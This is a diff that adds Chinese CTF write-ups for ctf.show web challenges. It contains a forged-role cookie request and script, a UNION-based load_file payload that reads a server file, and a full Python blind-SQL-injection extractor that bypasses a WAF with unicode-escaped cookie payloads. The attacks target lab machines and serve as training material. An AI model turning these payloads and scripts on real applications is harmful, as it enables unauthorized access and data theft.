@@ -7014,6 +7014,70 @@ flag.txt  shell.php
 
 ------
 
+### Cookie伪造
+
+靶机给了一个登录框，账号默认填写`guest`，尝试输入密码`guest`，登录成功，靶机显示内容如下：
+
+> CTFshow Verification Result
+> Login successful! welcome guest user
+
+用`Burp Suite`抓包，在`Cookie`中修改`role=guest`为`role=admin`。
+
+```
+POST /check.php HTTP/1.1
+Host: 0723bd9d-fd33-4bcb-b712-9b466be44487.challenge.ctf.show
+Cookie: PHPSESSID=21aeb8e2950cef30bfe004337271b92e; ro1e=admin
+Content-Length: 29
+Pragma: no-cache
+Cache-Control: no-cache
+Sec-Ch-Ua: "Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+Origin: https://0723bd9d-fd33-4bcb-b712-9b466be44487.challenge.ctf.show
+Content-Type: application/x-www-form-urlencoded
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0723bd9d-fd33-4bcb-b712-9b466be44487.challenge.ctf.show/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Priority: u=0, i
+Connection: keep-alive
+
+username=guest&password=guest
+```
+
+ `Burp Suite`放行靶机链接后，拿到`flag`。
+
+> CTFshow Verification Result
+> You are logged in as an admin user! Flag: CTF{cookie_injection_is_fun}
+
+编写`Python`代码自动获取`flag`。
+
+```python
+import re
+import requests
+
+url = 'http://0723bd9d-fd33-4bcb-b712-9b466be44487.challenge.ctf.show'
+headers = {'Cookie':'ro1e=admin;'} # 注意ro1e是1
+data = {'username':'guest', 'password':'guest'}
+r = requests.post(f'{url}/check.php', headers=headers, data=data)
+print(r.text) 
+flag_match = re.search(r'CTF\{[0-9a-zA-Z_\-]+\}', r.text)
+if flag_match:
+    flag = flag_match.group(0)
+    print(flag)
+# CTF{cookie_injection_is_fun}
+```
+
+提交`CTF{cookie_injection_is_fun}`即可。
+
+------
+
 ### web1
 
 进入靶机后看到一行信息：where is flag?
@@ -8214,7 +8278,7 @@ Table: content
 +----------+------------------------------------------+
 ```
 
-好家伙，被出题老头耍了这是。世上没有白走的路，走过的路都算数好吧。利用`SQL`注入点来读取文件。构建`payload`读取`secret`，`-1 union select load_file('/var/www/html/secret.php')`。
+好家伙，被出题老头耍了这是。世上没有白走的路，走过的路都算数好吧。虽然`flag`并不存储在数据库中，但是我们可以利用`SQL`注入漏洞来读取`secret`文件。构建`payload`用`SQL`的`load_file()`函数读取`secret.php`，`-1 union select load_file('/var/www/html/secret.php')`。
 
 ```
 /here_1s_your_f1ag.php?query=-1/**/union/**/select/**/load_file(%27/var/www/html/secret.php%27)
@@ -8251,6 +8315,260 @@ if(trim(@file_get_contents($file)) === 'ctf.show'){
 ```
 
 提交`ctfshow{273eca28-414f-4e88-85a6-92d5a5e5a81c}`即可。
+
+------
+
+### web15
+
+`dirsearch -u`扫描靶机，发现网站备份文件`www.zip`，访问`/www.zip`下载压缩包，解压后审计代码。
+
+`admin/login.php`中存在`SQL`注入点。
+
+```php
+<?php
+include ("../include/common.php");
+if (isset($_POST['user']) && isset($_POST['pass']) && isset($_POST['login'])) {
+    $user = addslashes($_POST['user']);
+    $pass = addslashes($_POST['pass']);
+    $safepassword = $_POST['safepassword'];
+    $row = $DB->get_row("SELECT * FROM fish_admin WHERE username='$user' limit 1");
+    if ($row['username'] == '') {
+        exit("<script language='javascript'>alert('The administrator account or password is incorrect!');history.go(-1);</script>");
+    } elseif (md5($pass) != $row['password']) {
+        exit("<script language='javascript'>alert('The administrator account or password is incorrect!');history.go(-1);</script>");
+    } elseif ($row['username'] == $user && $row['password'] == md5($pass)) {
+        if (isset($_POST['ispersis'])) {
+            $login_data['admin_user']=$user;
+            $login_data['admin_pass']=sha1(md5($pass) . LOGIN_KEY);
+            setcookie("islogin", "1",time() + 604800 );
+            setcookie("login_data",json_encode($login_data),time() + 604800,null,null,true);
+            $realip = real_ip();
+            $address = getCity($realip);
+            $ua = $_SERVER['HTTP_USER_AGENT'];
+            $device = get_device($ua);
+            $time = date("Y-m-d H:i:s");
+            $sql = "INSERT INTO `fish_ip` (`admin`, `ip`, `addres`, `platform`, `date`) VALUES ('{$row['id']}','{$realip}','{$address}','{$device}','{$time}');";
+            $DB->query($sql);
+            unset($login_data);
+            exit("<script language='javascript'>alert('login successful!');window.location.href='./';</script>");
+        } else {
+            $_SESSION['islogin'] = 1;
+            $_SESSION['admin_user'] = base64_encode($user);
+            $_SESSION['admin_pass'] = sha1(md5($pass) . LOGIN_KEY);
+            $realip = real_ip();
+            $address = getCity($realip);
+            $ua = $_SERVER['HTTP_USER_AGENT'];
+            $device = get_device($ua);
+            $time = date("Y-m-d H:i:s");
+            $sql = "INSERT INTO `fish_ip` (`admin`, `ip`, `addres`, `platform`, `date`) VALUES ('{$row['id']}','{$realip}','{$address}','{$device}','{$time}');";
+            $DB->query($sql);
+            exit("<script language='javascript'>alert('Login Successful!');window.location.href='./';</script>");
+        }
+    }
+} elseif (isset($_GET['logout'])) {
+    setcookie("islogin", "");
+    setcookie("login_data", "");
+    unset($_SESSION['islogin']);
+    unset($_SESSION['admin_user']);
+    unset($_SESSION['admin_pass']);
+    exit("<script language='javascript'>alert('You have successfully logged out of this login!');window.location.href='./login.php';</script>");
+} elseif ($islogin == 1) {
+    exit("<script language='javascript'>alert('You are already logged in!');window.location.href='./';</script>");
+} ?>
+```
+
+尝试`sqlmap`爆破未果，继续审计代码发现`include/safe.php`中存在`waf`。
+
+```php
+<?php
+function waf($string)
+{
+    $blacklist = '/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|<|>|\#|\s/i';
+    return preg_replace_callback($blacklist, function ($match) {
+        return '@' . $match[0] . '@';
+    }, $string);
+}
+
+function safe($string)
+{
+    if (is_array($string)) {
+        foreach ($string as $key => $val) {
+            $string[$key] = safe($val);
+        }
+    } else {
+        $string = waf($string);
+    }
+    return $string;
+}
+```
+
+`include/member.php`中存在`SQL`注入漏洞，很多`time()`，应该是考察时间盲注。
+
+```php
+<?php
+if (!defined('IN_CRONLITE')) exit();
+$islogin = 0;
+if (isset($_COOKIE["islogin"])) {
+    if ($_COOKIE["login_data"]) {
+        $login_data = json_decode($_COOKIE['login_data'], true);
+        $admin_user = $login_data['admin_user'];
+        $udata = $DB->get_row("SELECT * FROM fish_admin WHERE username='$admin_user' limit 1");
+        if ($udata['username'] == '') {
+            setcookie("islogin", "", time() - 604800);
+            setcookie("login_data", "", time() - 604800);
+        }
+        $admin_pass = sha1($udata['password'] . LOGIN_KEY);
+        if ($admin_pass == $login_data['admin_pass']) {
+            $islogin = 1;
+        } else {
+            setcookie("islogin", "", time() - 604800);
+            setcookie("login_data", "", time() - 604800);
+        }
+    }
+}
+if (isset($_SESSION['islogin'])) {
+    if ($_SESSION["admin_user"]) {
+        $admin_user = base64_decode($_SESSION['admin_user']);
+        $udata = $DB->get_row("SELECT * FROM fish_admin WHERE username='$admin_user' limit 1");
+        $admin_pass = sha1($udata['password'] . LOGIN_KEY);
+        if ($admin_pass == $_SESSION["admin_pass"]) {
+            $islogin = 1;
+        }
+    }
+}
+?>
+```
+
+给我整不会了，翻阅`Write Up`，发现大佬写的`Python`代码如下：
+
+```python
+import requests
+
+url = "http://7ebb4b24-528d-4046-857d-bc7bb3465fff.challenge.ctf.show/admin/"
+
+def tamper(payload):
+    payload = payload.lower()
+    payload = payload.replace('u', '\\u0075')
+    payload = payload.replace('\'', '\\u0027')
+    payload = payload.replace('o', '\\u006f')
+    payload = payload.replace('i', '\\u0069')
+    payload = payload.replace('"', '\\u0022')
+    payload = payload.replace(' ', '\\u0020')
+    payload = payload.replace('s', '\\u0073')
+    payload = payload.replace('#', '\\u0023')
+    payload = payload.replace('>', '\\u003e')
+    payload = payload.replace('<', '\\u003c')
+    payload = payload.replace('-', '\\u002d')
+    payload = payload.replace('=', '\\u003d')
+    payload = payload.replace('f1a9', 'F1a9')
+    payload = payload.replace('f1', 'F1')
+    return payload
+
+def databaseName_len():
+    print ("start get database name length...")
+    for l in range(0,45):
+        payload = "1' or (length(database())=" + str(l+1) + ")#"
+        print(payload)
+        payload = tamper(payload)
+        print(payload)
+        tmpCookie = 'islogin=1;login_data={"admin_user":"%s","admin_pass":65}' % payload
+        print(tmpCookie)
+        exit()
+        headers = {'cookie': tmpCookie}
+        r =requests.get(url, headers=headers)
+        myHeaders = str(r.raw.headers)
+        if ((myHeaders.count("login_data") == 1)):
+            print('get db length = ' + str(l).lower())
+            break
+
+def get_databaseName():
+    flag = ''
+    for j in range(0, 15):
+        for c in range(0x20,0x7f):
+            if chr(c) == '\'' or chr(c) == ';' or chr(c) == '\\' or chr(c) == '+':
+                continue
+            else:
+                payload = "1' or (select (database()) between '" + flag + chr(c) + "' and '" +chr(126) + "')#"
+            # print(payload)
+            payload = tamper(payload)
+            tmpCookie = 'islogin=1;login_data={"admin_user":"%s","admin_pass":65}' % payload
+            headers = {'cookie': tmpCookie}
+            r =requests.get(url, headers=headers)
+            myHeaders = str(r.raw.headers)
+            if ((myHeaders.count("login_data") == 2)):
+                flag += chr(c - 1)
+                print('databasename = ' + flag.lower())
+                break
+
+def get_tableName():
+    flag = ''
+    for j in range(0, 10):           #blind inject
+        for c in range(0x20,0x7f):
+            if chr(c) == '\'' or chr(c) == ';' or chr(c) == '\\' or chr(c) == '+':
+                continue
+            else:
+                payload = "1' or (select (select table_name from information_schema.tables where table_schema=database() limit 3,1) between '" + flag + chr(c) + "' and '" +chr(126) + "')#"
+            # print(payload)
+            payload = tamper(payload)
+            tmpCookie = 'islogin=1;login_data={"admin_user":"%s","admin_pass":65}' % payload
+            headers = {'cookie': tmpCookie}
+            r =requests.get(url, headers=headers)
+            myHeaders = str(r.raw.headers)
+            if ((myHeaders.count("login_data") == 2)):
+                flag += chr(c - 1)
+                print('tablename = ' + flag.lower())
+                break
+
+def get_ColumnName():
+    flag = ''
+    for j in range(0, 10):           #blind inject
+        for c in range(0x20,0x7f):
+            if chr(c) == '\'' or chr(c) == ';' or chr(c) == '\\' or chr(c) == '+':
+                continue
+            else:
+                payload = "1' or (select (select column_name from information_schema.columns where table_name='fl2333g' limit 0,1) between '" + flag + chr(c) + "' and '" +chr(126) + "')#"
+            # print(payload)
+            payload = tamper(payload)
+            tmpCookie = 'islogin=1;login_data={"admin_user":"%s","admin_pass":65}' % payload
+            headers = {'cookie': tmpCookie}
+            r =requests.get(url, headers=headers)
+            myHeaders = str(r.raw.headers)
+            if ((myHeaders.count("login_data") == 2)):
+                flag += chr(c - 1)
+                print('column name = ' + flag.lower())
+                break
+
+def get_value():
+    flag = ''
+    for j in range(0, 50):           #blind inject
+        for c in range(0x20,0x7f):
+            if chr(c) == '\'' or chr(c) == ';' or chr(c) == '\\' or chr(c) == '+':
+                continue
+            else:
+                payload = "1' or (select (select flllllag from fl2333g) between '" + flag + chr(c) + "' and '" +chr(126) + "')#"
+            # print(payload)
+            payload = tamper(payload)
+            tmpCookie = 'islogin=1;login_data={"admin_user":"%s","admin_pass":65}' % payload
+            headers = {'cookie': tmpCookie}
+            r =requests.get(url, headers=headers)
+            myHeaders = str(r.raw.headers)
+            if ((myHeaders.count("login_data") == 2)):
+                flag += chr(c - 1)
+                print('flag = ' + flag.lower())
+                break
+
+if __name__ == '__main__':
+    # get_databaseName() 
+    # databasename = ctfshow_kouzone
+    # get_tableName()
+    # tablename = fl2333g
+    # get_ColumnName()
+    # column name = flllllag
+    get_value()
+    # flag = ctfshow{a47da13f-4d35-4e16-80fc-881a13e33a84}
+```
+
+提交`ctfshow{a47da13f-4d35-4e16-80fc-881a13e33a84}`即可。
 
 ------
 
